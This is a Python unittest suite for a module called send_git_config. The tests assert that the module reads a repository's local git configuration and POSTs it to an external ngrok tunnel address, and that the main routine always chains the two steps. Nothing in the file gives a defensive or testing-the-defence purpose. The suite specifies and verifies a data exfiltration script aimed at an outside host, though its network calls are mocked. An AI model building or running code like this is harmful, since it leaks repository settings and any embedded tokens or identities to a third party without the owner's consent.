import unittest
from unittest.mock import patch, MagicMock
import subprocess # Added this import
import requests # Added this import
import send_git_config # Assuming send_git_config.py is in the same directory or PYTHONPATH

class TestSendGitConfig(unittest.TestCase):

    @patch('send_git_config.subprocess.run')
    def test_get_git_config_success(self, mock_subprocess_run):
        # Configure the mock for subprocess.run
        mock_process = MagicMock()
        mock_process.stdout = "user.name=Test User\nuser.email=test@example.com"
        mock_subprocess_run.return_value = mock_process

        # Call the function
        result = send_git_config.get_git_config()

        # Assertions
        mock_subprocess_run.assert_called_once_with(
            ['git', 'config', '--local', '--list'],
            capture_output=True,
            text=True,
            check=True
        )
        self.assertEqual(result, "user.name=Test User\nuser.email=test@example.com")

    @patch('send_git_config.subprocess.run')
    def test_get_git_config_error(self, mock_subprocess_run):
        # Configure the mock to raise an error
        # subprocess.CalledProcessError needs to be available in the test file's scope
        mock_subprocess_run.side_effect = subprocess.CalledProcessError(1, ['git', 'config', '--local', '--list'])


        # Call the function
        result = send_git_config.get_git_config()

        # Assertions
        mock_subprocess_run.assert_called_once_with(
            ['git', 'config', '--local', '--list'],
            capture_output=True,
            text=True,
            check=True
        )
        self.assertIsNone(result)

    @patch('send_git_config.subprocess.run')
    def test_get_git_config_file_not_found(self, mock_subprocess_run):
        # Configure the mock to raise FileNotFoundError
        mock_subprocess_run.side_effect = FileNotFoundError

        # Call the function
        result = send_git_config.get_git_config()

        # Assertions
        mock_subprocess_run.assert_called_once_with(
            ['git', 'config', '--local', '--list'],
            capture_output=True,
            text=True,
            check=True
        )
        self.assertIsNone(result)

    @patch('send_git_config.requests.post')
    def test_send_data_to_server_success(self, mock_requests_post):
        # Configure the mock for requests.post
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_requests_post.return_value = mock_response

        # Data to send
        test_data = "user.name=Test User\nuser.email=test@example.com"

        # Call the function
        send_git_config.send_data_to_server(test_data)

        # Assertions
        mock_requests_post.assert_called_once_with(
            "https://nomasc-labs.ngrok.app/data?content_from_git_command",
            data=test_data
        )
        mock_response.raise_for_status.assert_called_once()

    @patch('send_git_config.requests.post')
    def test_send_data_to_server_error(self, mock_requests_post):
        # Configure the mock to raise an error
        # requests.exceptions.RequestException needs to be available
        mock_requests_post.side_effect = requests.exceptions.RequestException("Test error")

        # Data to send
        test_data = "user.name=Test User\nuser.email=test@example.com"

        # Call the function
        send_git_config.send_data_to_server(test_data)

        # Assertions
        mock_requests_post.assert_called_once_with(
            "https://nomasc-labs.ngrok.app/data?content_from_git_command",
            data=test_data
        )

    # To properly test the __main__ block, the main logic in send_git_config.py
    # should be encapsulated in a function, e.g., main().
    # Let's assume send_git_config.py is refactored to have a main() function.
    # If not, this test part might need adjustment or might not work as expected.

    @patch('send_git_config.send_data_to_server')
    @patch('send_git_config.get_git_config')
    def test_main_logic_success(self, mock_get_git_config, mock_send_data_to_server):
        mock_get_git_config.return_value = "git data"

        # Call the main_logic function
        send_git_config.main_logic()

        # Assertions
        mock_get_git_config.assert_called_once()
        mock_send_data_to_server.assert_called_once_with("git data")

    @patch('send_git_config.send_data_to_server')
    @patch('send_git_config.get_git_config')
    def test_main_logic_no_data(self, mock_get_git_config, mock_send_data_to_server):
        mock_get_git_config.return_value = None

        # Call the main_logic function
        send_git_config.main_logic()

        # Assertions
        mock_get_git_config.assert_called_once()
        mock_send_data_to_server.assert_not_called()


if __name__ == "__main__":
    unittest.main()
